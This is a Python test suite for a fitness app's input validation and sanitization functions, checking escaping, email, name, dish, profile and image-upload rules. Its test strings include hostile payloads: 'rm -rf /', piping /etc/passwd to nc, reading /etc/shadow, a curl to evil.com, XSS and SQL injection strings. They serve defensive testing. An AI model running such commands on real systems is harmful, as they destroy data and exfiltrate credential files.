"""Comprehensive Automated Test Suite for Input Validation and Sanitization.

Verifies:
- Script injection / XSS prevention via HTML escaping
- Command injection character stripping
- Strict email format validation and boundary limits
- User name validation against command metacharacters and tag injection
- Food dish name validation against command metacharacters
- Profile numeric boundary validation (weight, height, age, enums)
- Safe file upload validation (magic bytes, MIME types, dimensions, size limits)
"""

import io
import sys
import os
from PIL import Image

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils.validation import (
    sanitize_text,
    sanitize_for_prompt,
    validate_email,
    validate_name,
    validate_dish_name,
    validate_profile_inputs,
    validate_uploaded_image,
    ValidationError
)


def run_validation_tests():
    print("=== STARTING INPUT VALIDATION & SANITIZATION SECURITY TESTS ===")

    # --- TEST 1: Script Injection / XSS Prevention ---
    print("\n[Test 1] Testing Script Injection (XSS) Sanitization...")
    xss_payload = "<script>alert('pwned')</script><b>Bold Text</b>"
    cleaned_text = sanitize_text(xss_payload)
    assert "<script>" not in cleaned_text, "Raw script tags must not survive text sanitization!"
    assert "&lt;script&gt;" in cleaned_text, "Dangerous tags must be HTML escaped!"
    print(f"[PASS] XSS payload successfully neutralized to: {cleaned_text}")

    # --- TEST 2: Command Injection Character Stripping ---
    print("\n[Test 2] Testing OS Command Injection Neutralization...")
    cmd_injection = "chicken breast; rm -rf / ; cat /etc/passwd | nc 1.2.3.4 4444"
    cleaned_prompt = sanitize_for_prompt(cmd_injection)
    assert ";" not in cleaned_prompt, "Semicolons must be stripped from prompts!"
    assert "|" not in cleaned_prompt, "Pipes must be stripped from prompts!"
    print(f"[PASS] Command injection symbols stripped: '{cleaned_prompt}'")

    # --- TEST 3: Strict Email Validation ---
    print("\n[Test 3] Testing Email Validation Boundaries...")
    valid_emails = ["user@dietfit.ai", "first.last+fitness@domain.co.uk"]
    for em in valid_emails:
        assert validate_email(em) == em.lower()
        
    invalid_emails = [
        "not-an-email",
        "user@",
        "@domain.com",
        "user@domain",
        "user<script>@evil.com",
        "user;DROP TABLE users;--@evil.com"
    ]
    for bad_em in invalid_emails:
        try:
            validate_email(bad_em)
            assert False, f"Invalid email '{bad_em}' was accepted!"
        except ValidationError:
            pass
    print("[PASS] Email validation strictly enforced.")

    # --- TEST 4: Name & Dish Name Validation ---
    print("\n[Test 4] Testing Name & Dish Name Security Filters...")
    bad_names = [
        "A",  # too short
        "admin<script>",
        "user`whoami`",
        "user$(cat /etc/shadow)"
    ]
    for bn in bad_names:
        try:
            validate_name(bn)
            assert False, f"Malicious name '{bn}' was accepted!"
        except ValidationError:
            pass

    bad_dishes = [
        "pizza; sleep 10",
        "salad | curl evil.com",
        "<img src=x onerror=alert(1)>"
    ]
    for bd in bad_dishes:
        try:
            validate_dish_name(bd)
            assert False, f"Malicious dish name '{bd}' was accepted!"
        except ValidationError:
            pass
    print("[PASS] Name and dish name validation rejected injection payloads.")

    # --- TEST 5: Profile Numeric Boundaries & Enums ---
    print("\n[Test 5] Testing Profile Numeric Boundaries...")
    # Valid profile
    prof = validate_profile_inputs(
        weight=75.5, height=175.0, age=28,
        gender="Male", activity="Sedentary", goal="Lose Fat", diet="Balanced"
    )
    assert prof["weight_kg"] == 75.5
    assert prof["gender"] == "male"
    
    # Boundary violations
    boundary_cases = [
        (10.0, 175.0, 25, "male", "sedentary", "lose_fat", "balanced", "weight under min"),
        (500.0, 175.0, 25, "male", "sedentary", "lose_fat", "balanced", "weight over max"),
        (75.0, 30.0, 25, "male", "sedentary", "lose_fat", "balanced", "height under min"),
        (75.0, 175.0, 150, "male", "sedentary", "lose_fat", "balanced", "age over max"),
        (75.0, 175.0, 25, "alien", "sedentary", "lose_fat", "balanced", "invalid gender"),
        (75.0, 175.0, 25, "male", "couch_potato", "lose_fat", "balanced", "invalid activity"),
        (75.0, 175.0, 25, "male", "sedentary", "super_bulk", "balanced", "invalid goal"),
        (75.0, 175.0, 25, "male", "sedentary", "lose_fat", "carnivore_only", "invalid diet")
    ]
    for w, h, a, g, act, goal, diet, desc in boundary_cases:
        try:
            validate_profile_inputs(w, h, a, g, act, goal, diet)
            assert False, f"Failed boundary check: {desc}"
        except ValidationError:
            pass
    print("[PASS] Profile parameters and enums strictly validated.")

    # --- TEST 6: Secure File Upload Validation ---
    print("\n[Test 6] Testing File Upload Security & Integrity...")
    # Valid PNG image creation
    valid_img_buf = io.BytesIO()
    img = Image.new("RGB", (200, 200), color="blue")
    img.save(valid_img_buf, format="PNG")
    valid_img_buf.seek(0)
    
    is_valid, msg, opened = validate_uploaded_image(valid_img_buf)
    assert is_valid is True, f"Valid PNG image failed validation: {msg}"
    assert opened.size == (200, 200)

    # Corrupt / Malicious file masquerading as image
    fake_img = io.BytesIO(b"MZ\x90\x00\x03\x00\x00\x00This is an executable payload, not an image!")
    is_valid, msg, _ = validate_uploaded_image(fake_img)
    assert is_valid is False, "Executable payload must be rejected!"
    print(f"[PASS] Executable masquerading as image rejected: {msg}")

    # Decompression bomb / huge dimension attack
    huge_img_buf = io.BytesIO()
    huge_img = Image.new("RGB", (5000, 5000), color="red")
    huge_img.save(huge_img_buf, format="JPEG")
    huge_img_buf.seek(0)
    
    is_valid, msg, _ = validate_uploaded_image(huge_img_buf)
    assert is_valid is False, "Decompression bomb (> 4096px) must be rejected!"
    print(f"[PASS] Decompression bomb attempt rejected: {msg}")

    print("\n=== ALL INPUT VALIDATION & SANITIZATION TESTS PASSED! ===")


if __name__ == "__main__":
    run_validation_tests()
